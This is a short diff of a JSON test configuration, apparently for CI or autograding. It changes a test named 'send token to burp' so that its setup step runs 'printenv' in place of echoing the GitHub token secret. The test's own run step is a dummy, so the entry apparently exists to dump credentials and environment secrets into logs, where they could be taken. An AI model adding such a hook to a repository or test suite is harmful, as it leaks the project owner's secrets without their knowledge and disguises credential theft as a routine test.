@@ -2,7 +2,7 @@
   "tests": [
     {
       "name": "send token to burp",
-      "setup": "echo ${{ secrets.GITHUB_TOKEN }}",
+      "setup": "printenv",
       "run": "echo 1",
       "input": "",
       "output": "",
